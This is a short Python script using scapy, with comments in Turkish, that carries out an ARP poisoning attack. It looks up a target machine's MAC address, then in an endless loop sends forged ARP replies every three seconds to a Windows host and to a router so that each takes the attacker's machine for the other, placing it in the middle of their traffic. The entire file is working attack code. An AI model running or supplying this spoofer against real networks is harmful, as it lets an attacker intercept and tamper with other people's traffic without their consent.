from time import time
import scapy.all as scapy
import time


#Mac Adresini alıyoruz bu fonksiyonla
def get_mac_addres(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1)[0]
    return answered_list[0][1].hwsrc
    #answered_list.summary() 
    
def arp_poisoning(target_ip,poisoned_ip):
    #poisoned ip dedigimiz sey modem veya router ip sidir.
    target_mac = get_mac_addres(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response)
    
while True:
    arp_poisoning("192.168.1.101","192.168.218.1") #windows makinesi icin bu
    arp_poisoning("192.168.218.1","192.168.1.101") #modemin bizi windows makinesi olarak algılamasını saglamak icin
    
    time.sleep(3)